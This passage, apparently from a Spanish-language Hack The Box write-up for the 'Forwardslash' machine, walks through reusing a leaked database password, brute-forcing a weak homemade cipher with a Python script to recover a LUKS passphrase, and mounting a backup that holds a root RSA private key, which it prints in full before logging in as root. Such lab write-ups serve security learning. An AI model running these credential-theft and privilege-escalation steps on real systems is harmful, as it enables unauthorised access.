<span class="nt">-rwxrwxr-x</span> 1 chiv chiv 163 Jan 23 03:39 script.sh

<span class="nt">----------------------------------------------------------------------</span>
       Pain<span class="s1">'s Next-Gen Time Based Backup Viewer
       v0.1
       NOTE: not reading the right file yet, 
       only works if backup is taken in same second
----------------------------------------------------------------------

Current Time: 03:40:45
&lt;?php
/* Database credentials. Assuming you are running MySQL
server with default setting (user '</span>root<span class="s1">' with no password) */
define('</span>DB_SERVER<span class="s1">', '</span>localhost<span class="s1">');
define('</span>DB_USERNAME<span class="s1">', '</span>pain<span class="s1">');
define('</span>DB_PASSWORD<span class="s1">', '</span>db1f73a72678e857d91e71d2963a1afa9efbabb32164cc1d94dbc704<span class="s1">');
define('</span>DB_NAME<span class="s1">', '</span>site<span class="s1">');
 
/* Attempt to connect to MySQL database */
$link = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
 
// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}
?&gt;
chiv@forwardslash:~$
</span></code></pre></div></div>

<p>Contamos con credenciales del usuario <strong>pain</strong> y al parecer de la base de datos; podríamos tratar de loguearnos a la base de datos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chiv@forwardslash:~<span class="nv">$ </span>mysql <span class="nt">-upain</span> <span class="nt">-p</span>
Enter password: 
ERROR 1045 <span class="o">(</span>28000<span class="o">)</span>: Access denied <span class="k">for </span>user <span class="s1">'pain'</span>@<span class="s1">'localhost'</span> <span class="o">(</span>using password: YES<span class="o">)</span>
</code></pre></div></div>

<p>Vemos que no podemos. Otra cosa que podriamos tratar es migrar a dicho usuario:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chiv@forwardslash:~<span class="nv">$ </span>su pain
Password: 
pain@forwardslash:/home/chiv<span class="nv">$ </span><span class="nb">whoami
</span>pain
pain@forwardslash:/home/chiv<span class="err">$</span>
</code></pre></div></div>

<p>Ya somos el usuario <strong>pain</strong> y ahora si podemos visualizar la flag (user.txt). Ahora necesitamos migrar al usuario <strong>root</strong>; por lo que vamos a enumerar un poco el sistema.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pain@forwardslash:~<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>pain<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>pain<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>pain<span class="o">)</span>,1002<span class="o">(</span>backupoperator<span class="o">)</span>
pain@forwardslash:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>pain on forwardslash:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User pain may run the following commands on forwardslash:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /sbin/cryptsetup luksOpen <span class="k">*</span>
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /bin/mount /dev/mapper/backup ./mnt/
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /bin/umount ./mnt/
pain@forwardslash:~<span class="err">$</span>
</code></pre></div></div>

<p>Vemos que podemos ejecutar algunas utilidades como el usuario <strong>root</strong>; además vemos un recurso en nuestro directorio de trabajo llamado <strong>encryptorinator</strong>. Con <code class="language-plaintext highlighter-rouge">cryuptsetup</code> podemos cifrar el disco de nuestro equipo, por lo que ya debemos estar pensando que necesitamos una contraseña la cual podríamos obtenerla a partir de los archivos en el directorio de trabajo del usuario <strong>pain</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pain@forwardslash:~<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
total 12
drwxr-xr-x 2 pain root 4096 Apr  8  2021 encryptorinator
<span class="nt">-rw-r--r--</span> 1 pain root  256 Jun  3  2019 note.txt
<span class="nt">-rw-------</span> 1 pain pain   33 Jan 23 07:43 user.txt
pain@forwardslash:~<span class="nv">$ </span><span class="nb">cd </span>encryptorinator/
pain@forwardslash:~/encryptorinator<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
total 8
<span class="nt">-rw-r--r--</span> 1 pain root 165 Jun  3  2019 ciphertext
<span class="nt">-rw-r--r--</span> 1 pain root 931 Jun  3  2019 encrypter.py
pain@forwardslash:~/encryptorinator<span class="err">$</span>
</code></pre></div></div>

<p>Vamos a echarle un ojito al script en python:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pain@forwardslash:~/encryptorinator<span class="nv">$ </span><span class="nb">cat </span>encrypter.py 
def encrypt<span class="o">(</span>key, msg<span class="o">)</span>:
    key <span class="o">=</span> list<span class="o">(</span>key<span class="o">)</span>
    msg <span class="o">=</span> list<span class="o">(</span>msg<span class="o">)</span>
    <span class="k">for </span>char_key <span class="k">in </span>key:
        <span class="k">for </span>i <span class="k">in </span>range<span class="o">(</span>len<span class="o">(</span>msg<span class="o">))</span>:
            <span class="k">if </span>i <span class="o">==</span> 0:
                tmp <span class="o">=</span> ord<span class="o">(</span>msg[i]<span class="o">)</span> + ord<span class="o">(</span>char_key<span class="o">)</span> + ord<span class="o">(</span>msg[-1]<span class="o">)</span>
            <span class="k">else</span>:
                tmp <span class="o">=</span> ord<span class="o">(</span>msg[i]<span class="o">)</span> + ord<span class="o">(</span>char_key<span class="o">)</span> + ord<span class="o">(</span>msg[i-1]<span class="o">)</span>

            <span class="k">while </span>tmp <span class="o">&gt;</span> 255:
                tmp -<span class="o">=</span> 256
            msg[i] <span class="o">=</span> chr<span class="o">(</span>tmp<span class="o">)</span>
    <span class="k">return</span> <span class="s1">''</span>.join<span class="o">(</span>msg<span class="o">)</span>

def decrypt<span class="o">(</span>key, msg<span class="o">)</span>:
    key <span class="o">=</span> list<span class="o">(</span>key<span class="o">)</span>
    msg <span class="o">=</span> list<span class="o">(</span>msg<span class="o">)</span>
    <span class="k">for </span>char_key <span class="k">in </span>reversed<span class="o">(</span>key<span class="o">)</span>:
        <span class="k">for </span>i <span class="k">in </span>reversed<span class="o">(</span>range<span class="o">(</span>len<span class="o">(</span>msg<span class="o">)))</span>:
            <span class="k">if </span>i <span class="o">==</span> 0:
                tmp <span class="o">=</span> ord<span class="o">(</span>msg[i]<span class="o">)</span> - <span class="o">(</span>ord<span class="o">(</span>char_key<span class="o">)</span> + ord<span class="o">(</span>msg[-1]<span class="o">))</span>
            <span class="k">else</span>:
                tmp <span class="o">=</span> ord<span class="o">(</span>msg[i]<span class="o">)</span> - <span class="o">(</span>ord<span class="o">(</span>char_key<span class="o">)</span> + ord<span class="o">(</span>msg[i-1]<span class="o">))</span>
            <span class="k">while </span>tmp &lt; 0:
                tmp +<span class="o">=</span> 256
            msg[i] <span class="o">=</span> chr<span class="o">(</span>tmp<span class="o">)</span>
    <span class="k">return</span> <span class="s1">''</span>.join<span class="o">(</span>msg<span class="o">)</span>


print encrypt<span class="o">(</span><span class="s1">'REDACTED'</span>, <span class="s1">'REDACTED'</span><span class="o">)</span>
print decrypt<span class="o">(</span><span class="s1">'REDACTED'</span>, encrypt<span class="o">(</span><span class="s1">'REDACTED'</span>, <span class="s1">'REDACTED'</span><span class="o">))</span>
pain@forwardslash:~/encryptorinator<span class="err">$</span>
</code></pre></div></div>

<p>Tiene dos funciones, una para cifrar y otras para descifrar, como parámetros necesitamos una llave y el mensaje, tenemos el mensaje que es el otro archivo llamado <code class="language-plaintext highlighter-rouge">ciphertext</code>; sin embargo, no tenemos la llave. Entonces vamos a tratar de modificar el programa para tratar de encontrar la llave y poder leer el texto cifrado.</p>

<p>Vamos pensar que la clave podría ser una serie de un caracter repido, es decir, <code class="language-plaintext highlighter-rouge">aaaaaaa</code>, <code class="language-plaintext highlighter-rouge">bbbbbbb</code>; en caso de que no aplique, vamos a realizar todas las combinaciones posibles.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">msg</span><span class="p">):</span>
    <span class="n">key</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
    <span class="n">msg</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">char_key</span> <span class="ow">in</span> <span class="n">key</span><span class="p">:</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">msg</span><span class="p">)):</span>
            <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
                <span class="n">tmp</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="n">char_key</span><span class="p">)</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">tmp</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="n">char_key</span><span class="p">)</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">])</span>

            <span class="k">while</span> <span class="n">tmp</span> <span class="o">&gt;</span> <span class="mi">255</span><span class="p">:</span>
                <span class="n">tmp</span> <span class="o">-=</span> <span class="mi">256</span>
            <span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span>
    <span class="k">return</span> <span class="s">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">msg</span><span class="p">):</span>
    <span class="n">key</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
    <span class="n">msg</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">char_key</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="n">key</span><span class="p">):</span>
        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">reversed</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">msg</span><span class="p">))):</span>
            <span class="k">if</span> <span class="n">i</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
                <span class="n">tmp</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">-</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">char_key</span><span class="p">)</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]))</span>
            <span class="k">else</span><span class="p">:</span>
                <span class="n">tmp</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">-</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">char_key</span><span class="p">)</span> <span class="o">+</span> <span class="nb">ord</span><span class="p">(</span><span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="o">-</span><span class="mi">1</span><span class="p">]))</span>
            <span class="k">while</span> <span class="n">tmp</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
                <span class="n">tmp</span> <span class="o">+=</span> <span class="mi">256</span>
            <span class="n">msg</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">tmp</span><span class="p">)</span>
    <span class="k">return</span> <span class="s">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
    <span class="n">ciphertext</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">'ciphertext'</span><span class="p">,</span><span class="s">'r'</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">rstrip</span><span class="p">()</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">165</span><span class="p">):</span> <span class="c1"># Longitud de la llave
</span>        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">33</span><span class="p">,</span> <span class="mi">126</span><span class="p">):</span> <span class="c1"># Caracteres de ASCII en decimal - man ascii
</span>            <span class="n">key</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">j</span><span class="p">)</span><span class="o">*</span><span class="n">i</span> <span class="c1"># Convierte de decimal al caracter en ASCII
</span>            <span class="n">msg</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">key</span><span class="p">,</span><span class="n">ciphertext</span><span class="p">)</span>
            <span class="k">if</span> <span class="s">'the'</span> <span class="ow">in</span> <span class="n">msg</span> <span class="ow">or</span> <span class="s">'and'</span> <span class="ow">in</span> <span class="n">msg</span><span class="p">:</span>
                <span class="nb">exit</span><span class="p">(</span><span class="s">"Clave: {0}, Longitud de la clave: {1}, Mensaje: {2}"</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="n">key</span><span class="p">,</span><span class="nb">len</span><span class="p">(</span><span class="n">key</span><span class="p">),</span><span class="n">msg</span><span class="p">))</span>
<span class="c1">#print encrypt('REDACTED', 'REDACTED')
#print decrypt('REDACTED', encrypt('REDACTED', 'REDACTED'))
</span></code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pain@forwardslash:~/encryptorinator<span class="nv">$ </span>python encrypter.py 
Clave: ttttttttttttttttt, Longitud de la clave: 17, Mensaje: HlvF<span class="p">;</span>&amp;you liked my new encryption tool, pretty secure huh, anyway here is the key to the encrypted image from /var/backups/recovery: cB!6%sdH8Lj^@Y<span class="k">*</span><span class="nv">$C2cf</span>
pain@forwardslash:~/encryptorinator<span class="err">$</span>
</code></pre></div></div>

<p>Tenemos la llave que fue utilizada para cifrar el mensaje <code class="language-plaintext highlighter-rouge">ttttttttttttttttt</code>, la longitud de la llave que es 17 y el mensaje <strong><em>HlvF;&amp;you liked my new encryption tool, pretty secure huh, anyway here is the key to the encrypted image from /var/backups/recovery: cB!6%sdH8Lj^@Y</em>$C2cf</strong>* dentro del cual vemos una contraseña, la cual posiblemente podemos utilizar con <code class="language-plaintext highlighter-rouge">cryptsetup</code>; asi que vamos para allá:</p>

<p>Para ejecutar <code class="language-plaintext highlighter-rouge">/sbin/cryptsetup luksOpen</code> necesitamos una ruta en la cual se encuentre un archivo asociado a la imagen de un disco, en este caso en el mensaje nos indican la ruta <code class="language-plaintext highlighter-rouge">/var/backups/recovery</code> y dentro debe existir un recurso:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pain@forwardslash:/<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /var/backups/recovery
total 976568
<span class="nt">-rw-r-----</span> 1 root backupoperator 1000000000 Mar 24  2020 encrypted_backup.img
pain@forwardslash:/<span class="err">$</span>
</code></pre></div></div>

<p>Vemos que es un <code class="language-plaintext highlighter-rouge">.img</code>, así que vamos a ejecutarlo con <code class="language-plaintext highlighter-rouge">sudo</code> y nos pedirá una contraseña para descifrarlo y  es la que vemos en el mensaje <code class="language-plaintext highlighter-rouge">cB!6%sdH8Lj^@Y*$C2cf</code>:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pain@forwardslash:/<span class="nv">$ </span><span class="nb">sudo</span> /sbin/cryptsetup luksOpen /var/backups/recovery/encrypted_backup.img k4miyo
Enter passphrase <span class="k">for</span> /var/backups/recovery/encrypted_backup.img: 
pain@forwardslash:/<span class="err">$</span>
</code></pre></div></div>

<p>En <code class="language-plaintext highlighter-rouge">/dev/mapper/</code> debemos ver la imagen del disco que hemos creado con el nombre que eligimos:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pain@forwardslash:/<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /dev/mapper/
total 0
crw------- 1 root root 10, 236 Jan 23 07:43 control
lrwxrwxrwx 1 root root       7 Jan 23 08:11 k4miyo -&gt; ../dm-0
pain@forwardslash:/<span class="err">$</span>
</code></pre></div></div>

<p>Ahora debemos crear una montura en el sistema del disco ya descifrado para poder acceder a su contenido; sin embargo, si vemos los comandos que podemos ejecutar como <strong>root</strong>, nos indica que la imagen debe llamarse <strong>backup</strong>, así que ejecutamos <code class="language-plaintext highlighter-rouge">sudo /sbin/cryptsetup luksOpen /var/backups/recovery/encrypted_backup.img backup</code> para que se genere la imagen del disco con dicho nombre y luego creamos la montura.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pain@forwardslash:/<span class="nv">$ </span><span class="nb">sudo</span> /sbin/cryptsetup luksOpen /var/backups/recovery/encrypted_backup.img backup
Enter passphrase <span class="k">for</span> /var/backups/recovery/encrypted_backup.img: 
pain@forwardslash:/<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span> /dev/mapper/
total 0
lrwxrwxrwx 1 root root       7 Jan 23 08:18 backup -&gt; ../dm-1
crw------- 1 root root 10, 236 Jan 23 07:43 control
lrwxrwxrwx 1 root root       7 Jan 23 08:11 k4miyo -&gt; ../dm-0
pain@forwardslash:/<span class="nv">$ </span><span class="nb">sudo</span> /bin/mount /dev/mapper/backup ./mnt/
pain@forwardslash:/<span class="err">$</span>
</code></pre></div></div>

<p>Y ahora en <code class="language-plaintext highlighter-rouge">/mnt/</code> deben estar la imagen:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pain@forwardslash:/mnt<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-l</span>
total 4
<span class="nt">-rw-r--r--</span> 1 root root 1675 May 27  2019 id_rsa
pain@forwardslash:/mnt<span class="nv">$ </span><span class="nb">cat </span>id_rsa 
<span class="nt">-----BEGIN</span> RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA9i/r8VGof1vpIV6rhNE9hZfBDd3u6S16uNYqLn+xFgZEQBZK
RKh+WDykv/gukvUSauxWJndPq3F1Ck0xbcGQu6+1OBYb+fQ0B8raCRjwtwYF4gaf
yLFcOS111mKmUIB9qR1wDsmKRbtWPPPvgs2ruafgeiHujIEkiUUk9f3WTNqUsPQc
u2AG//ZCiqKWcWn0CcC2EhWsRQhLOvh3pGfv4gg0Gg/VNNiMPjDAYnr4iVg4XyEu
NWS2x9PtPasWsWRPLMEPtzLhJOnHE3iVJuTnFFhp2T6CtmZui4TJH3pij6wYYis9
MqzTmFwNzzx2HKS2tE2ty2c1CcW+F3GS/rn0EQIDAQABAoIBAQCPfjkg7D6xFSpa
V+rTPH6GeoB9C6mwYeDREYt+lNDsDHUFgbiCMk+KMLa6afcDkzLL/brtKsfWHwhg
G8Q+u/8XVn/jFAf0deFJ1XOmr9HGbA1LxB6oBLDDZvrzHYbhDzOvOchR5ijhIiNO
3cPx0t1QFkiiB1sarD9Wf2Xet7iMDArJI94G7yfnfUegtC5y38liJdb2TBXwvIZC
vROXZiQdmWCPEmwuE0aDj4HqmJvnIx9P4EAcTWuY0LdUU3zZcFgYlXiYT0xg2N1p
MIrAjjhgrQ3A2kXyxh9pzxsFlvIaSfxAvsL8LQy2Osl+i80WaORykmyFy5rmNLQD
Ih0cizb9AoGBAP2+PD2nV8y20kF6U0+JlwMG7WbV/rDF6+kVn0M2sfQKiAIUK3Wn
5YCeGARrMdZr4fidTN7koke02M4enSHEdZRTW2jRXlKfYHqSoVzLggnKVU/eghQs
V4gv6+cc787HojtuU7Ee66eWj0VSr0PXjFInzdSdmnd93oDZPzwF8QUnAoGBAPhg
e1VaHG89E4YWNxbfr739t5qPuizPJY7fIBOv9Z0G+P5KCtHJA5uxpELrF3hQjJU8
6Orz/0C+TxmlTGVOvkQWij4GC9rcOMaP03zXamQTSGNROM+S1I9UUoQBrwe2nQeh
i2B/AlO4PrOHJtfSXIzsedmDNLoMqO5/n/xAqLAHAoGATnv8CBntt11JFYWvpSdq
tT38SlWgjK77dEIC2/hb/J8RSItSkfbXrvu3dA5wAOGnqI2HDF5tr35JnR+s/JfW
woUx/e7cnPO9FMyr6pbr5vlVf/nUBEde37nq3rZ9mlj3XiiW7G8i9thEAm471eEi
/vpe2QfSkmk1XGdV/svbq/sCgYAZ6FZ1DLUylThYIDEW3bZDJxfjs2JEEkdko7mA
1DXWb0fBno+KWmFZ+CmeIU+NaTmAx520BEd3xWIS1r8lQhVunLtGxPKvnZD+hToW
J5IdZjWCxpIadMJfQPhqdJKBR3cRuLQFGLpxaSKBL3PJx1OID5KWMa1qSq/EUOOr
OENgOQKBgD/mYgPSmbqpNZI0/B+6ua9kQJAH6JS44v+yFkHfNTW0M7UIjU7wkGQw
ddMNjhpwVZ3//G6UhWSojUScQTERANt8R+J6dR0YfPzHnsDIoRc7IABQmxxygXDo
ZoYDzlPAlwJmoPQXauRl1CgjlyHrVUTfS0AkQH2ZbqvK5/Metq8o
<span class="nt">-----END</span> RSA PRIVATE KEY-----
pain@forwardslash:/mnt<span class="nv">$ </span>
</code></pre></div></div>

<p>Vemos que se trata de una <code class="language-plaintext highlighter-rouge">id_rsa</code> y lo más seguro es que sea del usuario <strong>root</strong>; asi que vamos a copiarla a nuestro equipo, le asignamos permiso 600 y procedemos a conectarnos como el usuario <strong>root</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>id_rsa
───────┬────────────────────────────────────────────────────────────────────
       │ File: id_rsa
───────┼────────────────────────────────────────────────────────────────────
   1   │ <span class="nt">-----BEGIN</span> RSA PRIVATE KEY-----
   2   │ MIIEowIBAAKCAQEA9i/r8VGof1vpIV6rhNE9hZfBDd3u6S16uNYqLn+xFgZEQBZK
   3   │ RKh+WDykv/gukvUSauxWJndPq3F1Ck0xbcGQu6+1OBYb+fQ0B8raCRjwtwYF4gaf
   4   │ yLFcOS111mKmUIB9qR1wDsmKRbtWPPPvgs2ruafgeiHujIEkiUUk9f3WTNqUsPQc
   5   │ u2AG//ZCiqKWcWn0CcC2EhWsRQhLOvh3pGfv4gg0Gg/VNNiMPjDAYnr4iVg4XyEu
   6   │ NWS2x9PtPasWsWRPLMEPtzLhJOnHE3iVJuTnFFhp2T6CtmZui4TJH3pij6wYYis9
   7   │ MqzTmFwNzzx2HKS2tE2ty2c1CcW+F3GS/rn0EQIDAQABAoIBAQCPfjkg7D6xFSpa
   8   │ V+rTPH6GeoB9C6mwYeDREYt+lNDsDHUFgbiCMk+KMLa6afcDkzLL/brtKsfWHwhg
   9   │ G8Q+u/8XVn/jFAf0deFJ1XOmr9HGbA1LxB6oBLDDZvrzHYbhDzOvOchR5ijhIiNO
  10   │ 3cPx0t1QFkiiB1sarD9Wf2Xet7iMDArJI94G7yfnfUegtC5y38liJdb2TBXwvIZC
  11   │ vROXZiQdmWCPEmwuE0aDj4HqmJvnIx9P4EAcTWuY0LdUU3zZcFgYlXiYT0xg2N1p
  12   │ MIrAjjhgrQ3A2kXyxh9pzxsFlvIaSfxAvsL8LQy2Osl+i80WaORykmyFy5rmNLQD
  13   │ Ih0cizb9AoGBAP2+PD2nV8y20kF6U0+JlwMG7WbV/rDF6+kVn0M2sfQKiAIUK3Wn
  14   │ 5YCeGARrMdZr4fidTN7koke02M4enSHEdZRTW2jRXlKfYHqSoVzLggnKVU/eghQs
  15   │ V4gv6+cc787HojtuU7Ee66eWj0VSr0PXjFInzdSdmnd93oDZPzwF8QUnAoGBAPhg
  16   │ e1VaHG89E4YWNxbfr739t5qPuizPJY7fIBOv9Z0G+P5KCtHJA5uxpELrF3hQjJU8
  17   │ 6Orz/0C+TxmlTGVOvkQWij4GC9rcOMaP03zXamQTSGNROM+S1I9UUoQBrwe2nQeh
  18   │ i2B/AlO4PrOHJtfSXIzsedmDNLoMqO5/n/xAqLAHAoGATnv8CBntt11JFYWvpSdq
  19   │ tT38SlWgjK77dEIC2/hb/J8RSItSkfbXrvu3dA5wAOGnqI2HDF5tr35JnR+s/JfW
  20   │ woUx/e7cnPO9FMyr6pbr5vlVf/nUBEde37nq3rZ9mlj3XiiW7G8i9thEAm471eEi
  21   │ /vpe2QfSkmk1XGdV/svbq/sCgYAZ6FZ1DLUylThYIDEW3bZDJxfjs2JEEkdko7mA
  22   │ 1DXWb0fBno+KWmFZ+CmeIU+NaTmAx520BEd3xWIS1r8lQhVunLtGxPKvnZD+hToW
  23   │ J5IdZjWCxpIadMJfQPhqdJKBR3cRuLQFGLpxaSKBL3PJx1OID5KWMa1qSq/EUOOr
  24   │ OENgOQKBgD/mYgPSmbqpNZI0/B+6ua9kQJAH6JS44v+yFkHfNTW0M7UIjU7wkGQw
  25   │ ddMNjhpwVZ3//G6UhWSojUScQTERANt8R+J6dR0YfPzHnsDIoRc7IABQmxxygXDo
  26   │ ZoYDzlPAlwJmoPQXauRl1CgjlyHrVUTfS0AkQH2ZbqvK5/Metq8o
  27   │ <span class="nt">-----END</span> RSA PRIVATE KEY-----
───────┴──────────────────────────────────────────────────────────────────────
❯ <span class="nb">chmod </span>600 id_rsa
❯ ssh <span class="nt">-i</span> id_rsa root@10.10.10.183
Welcome to Ubuntu 18.04.4 LTS <span class="o">(</span>GNU/Linux 4.15.0-91-generic x86_64<span class="o">)</span>

 <span class="k">*</span> Documentation:  https://help.ubuntu.com
 <span class="k">*</span> Management:     https://landscape.canonical.com
 <span class="k">*</span> Support:        https://ubuntu.com/advantage

  System information as of Sun Jan 23 08:23:49 UTC 2022

  System load:  0.0               Processes:             197
  Usage of /:   53.2% of 7.75GB   Users logged <span class="k">in</span>:       1
  Memory usage: 11%               IP address <span class="k">for </span>ens160: 10.10.10.183
  Swap usage:   0%


 <span class="k">*</span> Canonical Livepatch is available <span class="k">for </span>installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

15 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Apr 26 13:37:51 2021
root@forwardslash:~# <span class="nb">whoami
</span>root
root@forwardslash:~#
</code></pre></div></div>

<p>Ya somos el usuario <strong>root</strong> y podemos visualizar la flag (root.txt).</p>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#cryptography" class="page__taxonomy-item" rel="tag">Cryptography</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#web" class="page__taxonomy-item" rel="tag">Web</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#xxe" class="page__taxonomy-item" rel="tag">XXE</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#hard" class="page__taxonomy-item" rel="tag">Hard</a><span class="sep">, </span>
    
      
      
      <a href="/categories/#linux" class="page__taxonomy-item" rel="tag">Linux</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2022-01-23T00:00:00-06:00">January 23, 2022</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/htb-popcorn/" class="pagination--pager" title="Hack The Box Popcorn
">Previous</a>
    
    
      <a href="#" class="pagination--pager disabled">Next</a>
    
  </nav>

    </div>

    
  </article>

  
</div>

    </div>

    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">© 2022 K4miyo</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>








  </body>
</html>
